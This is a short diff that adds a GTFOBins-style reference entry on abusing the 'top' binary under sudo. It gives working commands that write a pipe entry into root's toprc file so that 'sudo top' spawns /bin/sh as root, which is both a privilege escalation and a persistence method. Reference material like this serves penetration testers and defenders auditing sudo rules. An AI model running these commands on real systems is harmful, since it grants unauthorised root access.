@@ -1,0 +1,10 @@
+***** Sudo *****
+If the binary is allowed to run as superuser by sudo, it does not drop the
+elevated privileges and may be used to access the file system, escalate or
+maintain privileged access.
+    * This requires that the root configuration file is writable and might be
+      used to persist elevated privileges.
+      echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
+      sudo top
+      # press return twice
+      reset
